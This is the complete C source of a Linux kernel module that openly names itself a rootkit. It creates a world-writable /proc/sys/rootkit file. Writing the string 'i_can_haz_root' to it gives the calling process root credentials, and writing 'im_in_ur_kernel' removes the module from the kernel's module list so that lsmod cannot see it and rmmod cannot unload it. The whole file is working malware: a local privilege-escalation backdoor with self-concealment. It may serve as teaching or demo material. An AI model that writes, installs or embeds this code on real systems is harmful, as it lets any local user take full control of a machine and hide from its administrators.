#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/cred.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Nobody important");
MODULE_DESCRIPTION("Totally innocent kernel module");
MODULE_VERSION("1.0");

#define log(...) printk(KERN_INFO "rootkit: " __VA_ARGS__)

// Grants the calling process root permissions.
static int sysctl_escalate(void)
{
    struct cred *cred;
    
    log("Escalating caller creds to root\n");
    cred = prepare_kernel_cred(NULL);
    if (cred == NULL) {
        return -1;
    }
    return commit_creds(cred);
}

// Makes the module invisible. After this, should
// not see it in lsmod, and rmmod should fail to
// remove it. insmod will still fail since the
// kobject is still there and causes a name collision.
static int sysctl_hide(void)
{
    // Don't double-hide
    if (THIS_MODULE->list.next == NULL ||
        THIS_MODULE->list.prev == NULL) {
        log("Module already hidden\n");
        return 0;
    }

    mutex_lock(&module_mutex);
    list_del_rcu(&THIS_MODULE->list);
    mutex_unlock(&module_mutex);
    THIS_MODULE->list.next = NULL;
    THIS_MODULE->list.prev = NULL;
    log("Module successfully hidden\n");
    return 0;
}

// Used when the user reads from the sysctl file.
// Copies the given src string into the provided
// userspace buffer.
static int sysctl_strcpy_to_user(
    const char *src,
    char __user *buffer,
    size_t *lenp,
    loff_t *ppos)
{
    size_t buf_len, copy_len;
    loff_t start;

    buf_len = strlen(src);
    start = *ppos;
    copy_len = *lenp;

    if (start >= buf_len) {
        *lenp = 0;
        return 0;
    }

    if (copy_len > buf_len - start) {
        copy_len = buf_len - start;
    }
    
    if (copy_to_user(buffer, &src[start], copy_len)) {
        return -EFAULT;
    }

    *lenp = copy_len;
    *ppos += copy_len;
    return 0;
}

// Used when the user reads from the sysctl file.
// Copies the given src string into the provided
// userspace buffer.
static int sysctl_strcpy_to_kernel(
    char buffer[],
    size_t buf_len,
    char __user *src,
    size_t *lenp,
    loff_t *ppos)
{
    size_t copy_len;
    loff_t start;

    start = *ppos;
    copy_len = *lenp;

    if (copy_len > buf_len) {
        copy_len = buf_len;
    }
    
    if (copy_from_user(buffer, &src[start], copy_len)) {
        return -EFAULT;
    }
    buffer[buf_len - 1] = '\0';
    buffer[strcspn(buffer, "\r\n")] = '\0';

    return *lenp - copy_len;
}

static char cmd_buf[128];

// Gets called when a read/write to the /proc/sys/rootkit
// file occurs.
//
// To test read: cat /proc/sys/rootkit
// To test write: echo "foo" > /proc/sys/rootkit
static int sysctl_handler(
    struct ctl_table *ctl,
    int write,
    void __user *buffer,
    size_t *lenp,
    loff_t *ppos)
{
    if (!write) {
        return sysctl_strcpy_to_user("not_a_virus.mp3.doc.zip.exe\n", buffer, lenp, ppos);
    } else {
        sysctl_strcpy_to_kernel(cmd_buf, 128, buffer, lenp, ppos);
    }

    if (strcmp(cmd_buf, "i_can_haz_root") == 0) {
        return sysctl_escalate();
    } else if (strcmp(cmd_buf, "im_in_ur_kernel") == 0) {
        return sysctl_hide();
    } else {
        log("Unknown command: %s\n", cmd_buf);
        return -EINVAL;
    }
}

static struct ctl_table_header *ctl_hdr;
static struct ctl_table ctl_table[] = {
    {
        .procname = "rootkit",
        .data = cmd_buf,
        .maxlen = sizeof(cmd_buf),
        .mode = 0666,
        .child = NULL,
        .proc_handler = &sysctl_handler,
        .poll = NULL,
        .extra1 = NULL,
        .extra2 = NULL,
    },
    {}
};

// Called when the rootkit is loaded into the kernel
static int __init rootkit_init(void)
{
    ctl_hdr = register_sysctl_table(ctl_table);
    log("installed\n");
    return 0;
}

// Called when the rootkit is unloaded from the kernel
static void __exit rootkit_exit(void)
{
    unregister_sysctl_table(ctl_hdr);
    log("uninstalled\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
